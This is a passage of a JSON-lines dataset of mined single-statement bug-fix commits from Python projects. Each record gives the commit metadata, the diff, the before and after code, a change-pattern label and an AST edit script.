68], [\",:,\", \"T\"], 6], [\"Insert\", [\"list\", 3, 20, 3, 68], [\"string:'language'\", \"T\"], 7]]"}
{"project": "pootle", "commit_sha": "5265ddb1144142f73efe95aa6b8de4a633c8901e", "parent_sha": "c2c5b7b4a5581a19649d3c5d197fd2dd653ff0bc", "file_path": "local_apps/pootle_app/views/language/tp_common.py", "project_url": "https://github.com/mindcandy/pootle", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -279,4 +279,4 @@ class UploadHandler(view_handler.Handler):\n             newstats = translation_project.getquickstats()\n             post_file_upload.send(sender=translation_project, user=request.user, oldstats=oldstats,\n                                   newstats=newstats, archive=archive)\n-        return {}\n+        return {'upload': self}\n", "before": "return { }", "after": "return { 'upload' : self }", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"dictionary\", 3, 16, 3, 18], [\"pair\", \"N0\"], 1], [\"Insert\", \"N0\", [\"string:'upload'\", \"T\"], 0], [\"Insert\", \"N0\", [\":::\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:self\", \"T\"], 2]]"}
{"project": "salt", "commit_sha": "0ff09585952b9467bd9abee21ab7cb597d6b9909", "parent_sha": "8518d02ca3d7a437830ed2700cc0aaa54675a39b", "file_path": "salt/loader.py", "project_url": "https://github.com/Mattlk13/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -157,7 +157,7 @@ def grains(opts):\n         salt.config.load_config(\n             pre_opts, opts['conf_file'], 'SALT_MINION_CONFIG'\n         )\n-        default_include = pre_opts.get('default_include', [])\n+        default_include = pre_opts.get('default_include', opts['default_include'])\n         include = pre_opts.get('include', [])\n         pre_opts = salt.config.include_config(\n             default_include, pre_opts, opts['conf_file'], verbose=False\n", "before": "default_include = pre_opts . get ( 'default_include' , [ ] )", "after": "default_include = pre_opts . get ( 'default_include' , opts [ 'default_include' ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 39, 3, 62], [\"subscript\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:opts\", \"T\"], 0], [\"Move\", \"N0\", [\"[:[\", 3, 59, 3, 60], 1], [\"Insert\", \"N0\", [\"string:'default_include'\", \"T\"], 2], [\"Move\", \"N0\", [\"]:]\", 3, 60, 3, 61], 3], [\"Delete\", [\"list\", 3, 59, 3, 61]]]"}
{"project": "nova", "commit_sha": "8a8b0ba9abcf7237dc4a7d8ddfc739939c6e9164", "parent_sha": "a913d9b78510667acb5f5d9e001d255408c73c6f", "file_path": "nova/tests/api/openstack/compute/contrib/test_admin_actions.py", "project_url": "https://github.com/karimull/nova", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -169,7 +169,7 @@ class AdminActionsTest(CommonMixin, test.NoDBTestCase):\n     def test_actions_with_non_existed_instance(self):\n         actions = ['pause', 'unpause', 'suspend', 'resume',\n                    'resetNetwork', 'injectNetworkInfo', 'lock',\n-                   'unlock', 'os-resetState', 'migrate']\n+                   'unlock', 'os-resetState', 'migrate', 'os-migrateLive']\n         body_map = {'os-resetState': {'state': 'active'},\n                     'os-migrateLive':\n                                   {'host': 'hostname',\n", "before": "actions = [ 'pause' , 'unpause' , 'suspend' , 'resume' , 'resetNetwork' , 'injectNetworkInfo' , 'lock' , 'unlock' , 'os-resetState' , 'migrate' ]", "after": "actions = [ 'pause' , 'unpause' , 'suspend' , 'resume' , 'resetNetwork' , 'injectNetworkInfo' , 'lock' , 'unlock' , 'os-resetState' , 'migrate' , 'os-migrateLive' ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\",:,\", 1, 27, 1, 28], [\"list\", 1, 19, 3, 57], 15], [\"Insert\", [\"list\", 1, 19, 3, 57], [\",:,\", \"T\"], 2], [\"Insert\", [\"list\", 1, 19, 3, 57], [\",:,\", \"T\"], 21], [\"Insert\", [\"list\", 1, 19, 3, 57], [\"string:'os-migrateLive'\", \"T\"], 22], [\"Delete\", [\",:,\", 3, 28, 3, 29]]]"}
{"project": "pylearn2", "commit_sha": "2f4c2cac74fa163f0d52173300a7b9d019aa773a", "parent_sha": "32d236a2ed31abc7d3cd5b86424e7fc27252674a", "file_path": "pylearn2/utils/tests/test_iteration.py", "project_url": "https://github.com/reference-project/pylearn2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -92,7 +92,7 @@ def test_random_slice():\n     for iter_slice in iterator:\n         assert iter_slice.start >= 0\n         assert iter_slice.step is None or iter_slice.step == 1\n-        assert iter_slice.stop < 50\n+        assert iter_slice.stop <= 50\n         assert iter_slice.stop - iter_slice.start == 5\n         num += 1\n     assert num == 10\n", "before": "assert iter_slice . stop < 50", "after": "assert iter_slice . stop <= 50", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 16, 3, 36], [\"<=:<=\", \"T\"], 1], [\"Delete\", [\"<:<\", 3, 32, 3, 33]]]"}
{"project": "salt", "commit_sha": "b950f21cca6ec219a499efdf8f1fc8227114e199", "parent_sha": "e4878683c7cc44dc8ef9682a85bba7f78aa34253", "file_path": "salt/state.py", "project_url": "https://github.com/StepOneInc/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1975,7 +1975,7 @@ class BaseHighState(object):\n \n                     if env_key != xenv_key:\n                         # Resolve inc_sls in the specified environment\n-                        if env_key in matches and fnmatch.filter(self.avail[env_key], inc_sls):\n+                        if env_key in matches or fnmatch.filter(self.avail[env_key], inc_sls):\n                             resolved_envs = [env_key]\n                         else:\n                             resolved_envs = []\n", "before": "if env_key in matches and fnmatch . filter ( self . avail [ env_key ] , inc_sls ) : resolved_envs = [ env_key ] else : resolved_envs = [ ]", "after": "if env_key in matches or fnmatch . filter ( self . avail [ env_key ] , inc_sls ) : resolved_envs = [ env_key ] else : resolved_envs = [ ]", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 28, 3, 95], [\"or:or\", \"T\"], 1], [\"Delete\", [\"and:and\", 3, 47, 3, 50]]]"}
{"project": "addons-vauxoo", "commit_sha": "b436d57bcecfdbbfad74b64032b1a121628f4c14", "parent_sha": "2ba6f2c70233534eb20fb8b3c33d4fb32b88269f", "file_path": "commission_payment/model/commission.py", "project_url": "https://github.com/cloud9UG/addons-vauxoo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -296,7 +296,7 @@ class commission_payment(osv.Model):\n         for cp_brw in self.browse(cr, uid, ids, context=context):\n             inv_ids += [invoice.id for invoice in cp_brw.invoice_ids]\n         # choose the view_mode accordingly\n-        if len(inv_ids) > 1:\n+        if len(inv_ids) >= 1:\n             result['domain'] = \"[('id','in',[\"+','.join(\n                 [str(inv_id) for inv_id in inv_ids]\n             )+\"])]\"\n", "before": "if len ( inv_ids ) > 1 : result [ 'domain' ] = \"[('id','in',[\" + ',' . join ( [ str ( inv_id ) for inv_id in inv_ids ] ) + \"])]\"", "after": "if len ( inv_ids ) >= 1 : result [ 'domain' ] = \"[('id','in',[\" + ',' . join ( [ str ( inv_id ) for inv_id in inv_ids ] ) + \"])]\"", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 28], [\">=:>=\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 25, 3, 26]]]"}
{"project": "addons-vauxoo", "commit_sha": "bb6d4c45c948db731f947840d217c72a44cdc462", "parent_sha": "25009616930df41fd9496441e682d741ceed18a9", "file_path": "website_checkout_validations/controllers/main.py", "project_url": "https://github.com/cloud9UG/addons-vauxoo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -163,7 +163,7 @@ class WebsiteSaleInh(website_sale):\n         if query.get(prefix + 'mobile'):\n             query[prefix + 'mobile'] = int(query[prefix + 'mobile'])\n         if query.get(prefix + 'is_company') == 'company' or query.get(prefix + 'is_company') == True:  # noqa\n-            query[prefix + 'is_company'] == True\n+            query[prefix + 'is_company'] = True\n         else:\n             query[prefix + 'is_company'] = False\n             query[prefix + 'is_particular'] = True\n", "before": "query [ prefix + 'is_company' ] == True", "after": "query [ prefix + 'is_company' ] = True", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"expression_statement\", 3, 13, 3, 49], [\"assignment\", \"N0\"], 0], [\"Move\", \"N0\", [\"subscript\", 3, 13, 3, 41], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Move\", \"N0\", [\"true:True\", 3, 45, 3, 49], 2], [\"Delete\", [\"==:==\", 3, 42, 3, 44]], [\"Delete\", [\"comparison_operator\", 3, 13, 3, 49]]]"}
{"project": "pexpect", "commit_sha": "96ec218be92a56a9c41ecfcf67c979a82e38d48a", "parent_sha": "fcfc30c9ce99f26029fb71cb695a0a2f6ff0a46c", "file_path": "tests/test_misc.py", "project_url": "https://github.com/INFOSECAPPS/pexpect", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -62,7 +62,7 @@ class TestCaseMisc(PexpectTestCase.PexpectTestCase):\n         line4 = child.readline(1)\n         line5 = child.readline()\n         assert child.isalive() is False, child.isalive()\n-        assert child.exitstatus != 0, child.exitstatus\n+        assert child.exitstatus == 0, child.exitstatus\n         self.assertEqual(line1, six.b(''))\n         self.assertEqual(line2, six.b('abc\\r\\n'))\n         assert (line3 == six.b('abc\\r\\n') or line3 == '123\\r\\n'), \\\n", "before": "assert child . exitstatus != 0 , child . exitstatus", "after": "assert child . exitstatus == 0 , child . exitstatus", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 16, 3, 37], [\"==:==\", \"T\"], 1], [\"Delete\", [\"!=:!=\", 3, 33, 3, 35]]]"}
{"project": "chainercv", "commit_sha": "4073dbc326753290c1074497dbcefc52663ac518", "parent_sha": "dd74ed70068dfca79e39cab0cbbe972b52886759", "file_path": "chainercv/tasks/keypoint_matching/eval_pck.py", "project_url": "https://github.com/yuyu2172/chainercv", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -35,5 +35,5 @@ def eval_pck(pred, expected, alpha, L):\n \n     difference = np.linalg.norm(pred[:, :2] - expected[:, :2], axis=1)\n \n-    pck_accuracy = np.mean(difference < alpha * L)\n+    pck_accuracy = np.mean(difference <= alpha * L)\n     return pck_accuracy\n", "before": "pck_accuracy = np . mean ( difference < alpha * L )", "after": "pck_accuracy = np . mean ( difference <= alpha * L )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 28, 3, 50], [\"<=:<=\", \"T\"], 1], [\"Delete\", [\"<:<\", 3, 39, 3, 40]]]"}
{"project": "https-github.com-fchollet-keras", "commit_sha": "c2534964b76015eb3d76261b025c7556b354764c", "parent_sha": "82353da4dc66bc702a74c6c233f3e16b7682f9e6", "file_path": "keras/layers/recurrent.py", "project_url": "https://github.com/amongstar/https-github.com-fchollet-keras", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -158,7 +158,7 @@ class SimpleRNN(Recurrent):\n         assert len(states) == 1\n         prev_output = states[0]\n         h = K.dot(x, self.W) + self.b\n-        output = self.activation(h * K.dot(prev_output, self.U))\n+        output = self.activation(h + K.dot(prev_output, self.U))\n         return output, [output]\n \n     def get_config(self):\n", "before": "output = self . activation ( h * K . dot ( prev_output , self . U ) )", "after": "output = self . activation ( h + K . dot ( prev_output , self . U ) )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 34, 3, 64], [\"+:+\", \"T\"], 1], [\"Delete\", [\"*:*\", 3, 36, 3, 37]]]"}
{"project": "https-github.com-fchollet-keras", "commit_sha": "42b3d37a54545882699283b5764cf3c997f8d9cd", "parent_sha": "151a6fbab9e20b586ca435fc051405ddee7c95a8", "file_path": "tests/keras/preprocessing/test_sequence.py", "project_url": "https://github.com/amongstar/https-github.com-fchollet-keras", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -43,7 +43,7 @@ def test_skipgrams():\n     couples, labels = skipgrams(np.arange(5), vocabulary_size=5, window_size=1,\n                                 categorical=True)\n     for couple in couples:\n-        assert couple[0] - couple[1] < 3\n+        assert couple[0] - couple[1] <= 3\n     for l in labels:\n         assert len(l) == 2\n \n", "before": "assert couple [ 0 ] - couple [ 1 ] < 3", "after": "assert couple [ 0 ] - couple [ 1 ] <= 3", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 16, 3, 41], [\"<=:<=\", \"T\"], 1], [\"Delete\", [\"<:<\", 3, 38, 3, 39]]]"}
{"project": "cms", "commit_sha": "c7d76850a88bef9a7f56f75aed30db43cf7159e4", "parent_sha": "1b53a25899617f89b9f7edeb332b9bfc55f099b9", "file_path": "cms/service/EvaluationService.py", "project_url": "https://github.com/igortereshchenko/cms", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -970,7 +970,7 @@ class EvaluationService(TriggeredService):\n                 SubmissionResult.evaluation_tries <\n                 EvaluationService.MAX_EVALUATION_TRIES)\n             queries['max_evaluations'] = not_evaluated.filter(\n-                SubmissionResult.evaluation_tries <=\n+                SubmissionResult.evaluation_tries >=\n                 EvaluationService.MAX_EVALUATION_TRIES)\n             queries['scoring'] = evaluated.filter(\n                 not_(SubmissionResult.filter_scored()))\n", "before": "not_evaluated . filter ( SubmissionResult . evaluation_tries <= EvaluationService . MAX_EVALUATION_TRIES )", "after": "not_evaluated . filter ( SubmissionResult . evaluation_tries >= EvaluationService . MAX_EVALUATION_TRIES )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 17, 4, 55], [\">=:>=\", \"T\"], 1], [\"Delete\", [\"<=:<=\", 3, 51, 3, 53]]]"}
{"project": "https-github.com-fchollet-keras", "commit_sha": "6419d52543b8af2c50c9a7678e1dd42f96745961", "parent_sha": "7207c78e101a0620b8fe2891c74f94de181e15fc", "file_path": "keras/layers/noise.py", "project_url": "https://github.com/amongstar/https-github.com-fchollet-keras", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -77,7 +77,7 @@ class GaussianDropout(Layer):\n         if 0 < self.rate < 1:\n             def noised():\n                 stddev = np.sqrt(self.rate / (1.0 - self.rate))\n-                return inputs + K.random_normal(shape=K.shape(inputs),\n+                return inputs * K.random_normal(shape=K.shape(inputs),\n                                                 mean=1.0,\n                                                 stddev=stddev)\n             return K.in_train_phase(noised, inputs, training=training)\n", "before": "return inputs + K . random_normal ( shape = K . shape ( inputs ) , mean = 1.0 , stddev = stddev )", "after": "return inputs * K . random_normal ( shape = K . shape ( inputs ) , mean = 1.0 , stddev = stddev )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 24, 5, 63], [\"*:*\", \"T\"], 1], [\"Delete\", [\"+:+\", 3, 31, 3, 32]]]"}
{"project": "https-github.com-fchollet-keras", "commit_sha": "b4f7340cc9be4ce23c768c26a612df287c5bb883", "parent_sha": "22e3232e4d4e23dc284e77d2ca162dc67748ce42", "file_path": "keras/preprocessing/image.py", "project_url": "https://github.com/amongstar/https-github.com-fchollet-keras", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -708,7 +708,7 @@ class Iterator(object):\n                     index_array = np.random.permutation(n)\n \n             current_index = (self.batch_index * batch_size) % n\n-            if n >= current_index + batch_size:\n+            if n > current_index + batch_size:\n                 current_batch_size = batch_size\n                 self.batch_index += 1\n             else:\n", "before": "if n >= current_index + batch_size : current_batch_size = batch_size self . batch_index += 1 else : ", "after": "if n > current_index + batch_size : current_batch_size = batch_size self . batch_index += 1 else : ", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 16, 3, 47], [\">:>\", \"T\"], 1], [\"Delete\", [\">=:>=\", 3, 18, 3, 20]]]"}
{"project": "puzzle", "commit_sha": "9ed922acac84ef13be6c9cf4f0d9ffbcf0454e66", "parent_sha": "60b1d0f18c62a878cfe8255d6ba63fe7f79701b5", "file_path": "woot/apps/img/algorithms.py", "project_url": "https://github.com/NicholasPiano/puzzle", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -439,7 +439,7 @@ def mod_step13_cell_masks(composite, mod_id, algorithm):\n         if not os.path.exists(os.path.join(composite.experiment.cp2_path, composite.series.name, str(batch))):\n           os.makedirs(os.path.join(composite.experiment.cp2_path, composite.series.name, str(batch)))\n \n-        if len(os.listdir(os.path.join(composite.experiment.cp2_path, composite.series.name, str(batch))))==max_batch_size:\n+        if len(os.listdir(os.path.join(composite.experiment.cp2_path, composite.series.name, str(batch))))>=max_batch_size:\n           batch += 1\n           if not os.path.exists(os.path.join(composite.experiment.cp2_path, composite.series.name, str(batch))):\n             os.makedirs(os.path.join(composite.experiment.cp2_path, composite.series.name, str(batch)))\n", "before": "if len ( os . listdir ( os . path . join ( composite . experiment . cp2_path , composite . series . name , str ( batch ) ) ) ) == max_batch_size : batch += 1 if not os . path . exists ( os . path . join ( composite . experiment . cp2_path , composite . series . name , str ( batch ) ) ) : os . makedirs ( os . path . join ( composite . experiment . cp2_path , composite . series . name , str ( batch ) ) )", "after": "if len ( os . listdir ( os . path . join ( composite . experiment . cp2_path , composite . series . name , str ( batch ) ) ) ) >= max_batch_size : batch += 1 if not os . path . exists ( os . path . join ( composite . experiment . cp2_path , composite . series . name , str ( batch ) ) ) : os . makedirs ( os . path . join ( composite . experiment . cp2_path , composite . series . name , str ( batch ) ) )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 123], [\">=:>=\", \"T\"], 1], [\"Delete\", [\"==:==\", 3, 107, 3, 109]]]"}
{"project": "Qcodes", "commit_sha": "0eece0f6813ebad8c7dbb5d126d4bdc750389568", "parent_sha": "f995f0ca977b46e7e37a740f281452121d56e997", "file_path": "qcodes/instrument_drivers/Keysight/keysightb1500/KeysightB1500_sampling_measurement.py", "project_url": "https://github.com/jenshnielsen/Qcodes", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -74,7 +74,7 @@ class SamplingMeasurement(ParameterWithSetpoints):\n \n-        if self.data.status == None:\n+        if self.data.status is None:\n             raise MeasurementNotTaken('First run sampling_measurement'\n                                       ' method to generate the data')\n         else:\n", "before": "if self . data . status == None : raise MeasurementNotTaken ( 'First run sampling_measurement' ' method to generate the data' ) else : ", "after": "if self . data . status is None : raise MeasurementNotTaken ( 'First run sampling_measurement' ' method to generate the data' ) else : ", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 1, 12, 1, 36], [\"is:is\", \"T\"], 1], [\"Delete\", [\"==:==\", 1, 29, 1, 31]]]"}
{"project": "Qcodes", "commit_sha": "045f93434cdd171252bcbcb163be33eabf7b635b", "parent_sha": "5f79b9c7d3a92f349e799f1c8184caec88b8b3d9", "file_path": "qcodes/instrument_drivers/Keysight/keysightb1500/KeysightB1500_base.py", "project_url": "https://github.com/jenshnielsen/Qcodes", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -532,7 +532,7 @@ class IVSweepMeasurement(MultiParameter, StatusMixin):\n         channels = measurement_mode['channels']\n         n_channels = len(channels)\n \n-        if n_channels >= 1:\n+        if n_channels < 1:\n             raise ValueError('At least one measurement channel is needed for '\n                              'an IV sweep.')\n \n", "before": "if n_channels >= 1 : raise ValueError ( 'At least one measurement channel is needed for ' 'an IV sweep.' )", "after": "if n_channels < 1 : raise ValueError ( 'At least one measurement channel is needed for ' 'an IV sweep.' )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 27], [\"<:<\", \"T\"], 1], [\"Delete\", [\">=:>=\", 3, 23, 3, 25]]]"}
{"project": "BridgeUSB", "commit_sha": "da16c4eb66934847e938a2b3fd9d05b654a6cc05", "parent_sha": "6b3d7ebffb0005ae312db2ef2a270003df7e8f2d", "file_path": "linux/bridge/packet.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/BridgeUSB", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -137,7 +137,7 @@ class PacketReader:\n       self.index = ord(index)\n      \n     # Check for out-of-order packets\n-    if self.index > ord(index):\n+    if self.index != ord(index):\n       if not self.last_response is None:\n         send(ord(index), self.last_response)\n       return True\n", "before": "if self . index > ord ( index ) : if not self . last_response is None : send ( ord ( index ) , self . last_response ) return True", "after": "if self . index != ord ( index ) : if not self . last_response is None : send ( ord ( index ) , self . last_response ) return True", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 8, 3, 31], [\"!=:!=\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 19, 3, 20]]]"}
{"project": "pyinstaller", "commit_sha": "11fb61e9ac0d3f1583a0af11a44c2dd979da2e0a", "parent_sha": "0c597bcb54418fdfe86e40839f0aa51ceadea5e9", "file_path": "PyInstaller/__init__.py", "project_url": "https://github.com/StarfishStorage/pyinstaller", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -104,6 +104,6 @@ def get_version():\n     if len(VERSION) >= 4 and VERSION[3]:\n         version = '%s%s' % (version, VERSION[3])\n         # include git revision in version string\n-        if VERSION[3] == 'dev' and len(VERSION) == 5 and VERSION[4] > 0:\n+        if VERSION[3] == 'dev' and len(VERSION) >= 5 and VERSION[4] > 0:\n             version = '%s-%s' % (version, VERSION[4])\n     return version\n", "before": "if VERSION [ 3 ] == 'dev' and len ( VERSION ) == 5 and VERSION [ 4 ] > 0 : version = '%s-%s' % ( version , VERSION [ 4 ] )", "after": "if VERSION [ 3 ] == 'dev' and len ( VERSION ) >= 5 and VERSION [ 4 ] > 0 : version = '%s-%s' % ( version , VERSION [ 4 ] )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 36, 3, 53], [\">=:>=\", \"T\"], 1], [\"Delete\", [\"==:==\", 3, 49, 3, 51]]]"}
{"project": "portage-funtoo", "commit_sha": "4b1f09672d2b245188cb0a0bb8c2c2ee99610411", "parent_sha": "d62e6fcf8f8c420c00864e97f9bfd73dda7ee3e7", "file_path": "pym/_emerge/format_size.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/portage-funtoo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -15,7 +15,7 @@ def format_size(mysize):\n \t\t# Always round up to the next kB so that it doesn't show 0 kB when\n \t\t# some small file still needs to be fetched.\n \t\tmysize += 1024 - mysize % 1024\n-\tmystr=str(mysize/1024)\n+\tmystr=str(mysize//1024)\n \tmycount=len(mystr)\n \twhile (mycount > 3):\n \t\tmycount-=3\n", "before": "mystr = str ( mysize / 1024 )", "after": "mystr = str ( mysize // 1024 )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 12, 3, 23], [\"//://\", \"T\"], 1], [\"Delete\", [\"/:/\", 3, 18, 3, 19]]]"}
{"project": "portage-funtoo", "commit_sha": "611ec3edf3695453639f2436049d0005f6e6f769", "parent_sha": "46107423f4a039af6528d14cb86123a05a67f85f", "file_path": "pym/portage/util/_eventloop/EventLoop.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/portage-funtoo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -238,7 +238,7 @@ class EventLoop(object):\n \t\t\tself._timeout_handler_class(\n \t\t\t\tinterval=interval, function=function, args=args,\n \t\t\t\tsource_id=source_id, timestamp=time.time())\n-\t\tif self._timeout_interval is None or self._timeout_interval < interval:\n+\t\tif self._timeout_interval is None or self._timeout_interval > interval:\n \t\t\tself._timeout_interval = interval\n \t\treturn source_id\n \n", "before": "if self . _timeout_interval is None or self . _timeout_interval < interval : self . _timeout_interval = interval", "after": "if self . _timeout_interval is None or self . _timeout_interval > interval : self . _timeout_interval = interval", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 40, 3, 73], [\">:>\", \"T\"], 1], [\"Delete\", [\"<:<\", 3, 63, 3, 64]]]"}
{"project": "HexViewer", "commit_sha": "6d2e8693424d98d969df41b01db9aab7078f7dbc", "parent_sha": "3953542f194f65175f2ff680f64d243f3fbb83aa", "file_path": "hex_writer.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/HexViewer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -188,7 +188,7 @@ class HexWriterCommand(sublime_plugin.WindowCommand):\n         if self.handshake != -1 and self.handshake == self.view.id():\r\n             try:\r\n                 sublime.set_timeout(lambda: sublime.status_message(\"Writing...\"), 0)\r\n-                self.row = self.view.rowcol(self.view.size())[0] - 1\r\n+                self.row = self.view.rowcol(self.view.size())[0] + 1\r\n                 self.hex_buffer = StringIO(self.view.substr(sublime.Region(0, self.view.size())))\r\n                 self.thread = ThreadedWrite(self.hex_buffer, self.export_path, parse_view_data, self.row)\r\n                 self.thread.start()\r\n", "before": "self . row = self . view . rowcol ( self . view . size ( ) ) [ 0 ] - 1", "after": "self . row = self . view . rowcol ( self . view . size ( ) ) [ 0 ] + 1", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 28, 3, 69], [\"+:+\", \"T\"], 1], [\"Delete\", [\"-:-\", 3, 66, 3, 67]]]"}
{"project": "raven-python", "commit_sha": "f0ad0ca6a9de44128982de50c30157b779b69d71", "parent_sha": "1b31898fcacf50aed99e60125e9cc7d2429b61ac", "file_path": "raven/transport/registry.py", "project_url": "https://github.com/pozytywnie/raven-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -16,7 +16,7 @@ class TransportRegistry(object):\n                 self.register_transport(transport)\n \n     def register_transport(self, transport):\n-        if not hasattr(transport, 'scheme') and not hasattr(transport.scheme, '__iter__'):\n+        if not hasattr(transport, 'scheme') or not hasattr(transport.scheme, '__iter__'):\n             raise AttributeError('Transport %s must have a scheme list', transport.__class__.__name__)\n \n         for scheme in transport.scheme:\n", "before": "if not hasattr ( transport , 'scheme' ) and not hasattr ( transport . scheme , '__iter__' ) : raise AttributeError ( 'Transport %s must have a scheme list' , transport . __class__ . __name__ )", "after": "if not hasattr ( transport , 'scheme' ) or not hasattr ( transport . scheme , '__iter__' ) : raise AttributeError ( 'Transport %s must have a scheme list' , transport . __class__ . __name__ )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 16, 3, 90], [\"or:or\", \"T\"], 1], [\"Delete\", [\"and:and\", 3, 45, 3, 48]]]"}
{"project": "tailon", "commit_sha": "b11cd9af076405452738caf5ea2f23129cb31d18", "parent_sha": "ed1c545cdf1da399f0b6caf1eeb260c201b5921c", "file_path": "tailon/main.py", "project_url": "https://github.com/devsisters/tailon", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -134,7 +134,7 @@ def parseopts(args=None):\n         help='list of files or file wildcards to expose')\n \n     #-------------------------------------------------------------------------\n-    group == parser.add_argument_group('Optional arguments')\n+    group = parser.add_argument_group('Optional arguments')\n     arg = group.add_argument\n     arg('-h', '--help', action='help', help='show this help message and exit')\n     arg('-d', '--debug', action='store_true', help='show debug messages')\n", "before": "help = 'list of files or file wildcards to expose' ) group == parser . add_argument_group ( 'Optional arguments' )", "after": "help = 'list of files or file wildcards to expose' ) group = parser . add_argument_group ( 'Optional arguments' )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"assignment\", 0, 9, 3, 61], [\"assignment\", \"N0\"], 3], [\"Move\", \"N0\", [\"identifier:group\", 3, 5, 3, 10], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Move\", \"N0\", [\"call\", 3, 14, 3, 61], 2], [\"Delete\", [\"==:==\", 3, 11, 3, 13]], [\"Delete\", [\"comparison_operator\", 3, 5, 3, 61]]]"}
{"project": "htk-algorithms-python", "commit_sha": "1e8dd5c7d62089ab8cbf871daff108b9e6daff80", "parent_sha": "fc4820d02b9931d5c2cdd6b1e9d377a19840d956", "file_path": "algorithms/searching/binary_search.py", "project_url": "https://github.com/hacktoolkit/htk-algorithms-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -24,7 +24,7 @@ def search(seq, key):\n     lo = 0\n     hi = len(seq)\n \n-    while hi > lo:\n+    while hi >= lo:\n         mid = (lo + hi) / 2\n         if seq[mid] < key:\n             lo = mid + 1\n", "before": "while hi > lo : mid = ( lo + hi ) / 2 if seq [ mid ] < key : lo = mid + 1", "after": "while hi >= lo : mid = ( lo + hi ) / 2 if seq [ mid ] < key : lo = mid + 1", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 11, 3, 18], [\">=:>=\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 14, 3, 15]]]"}
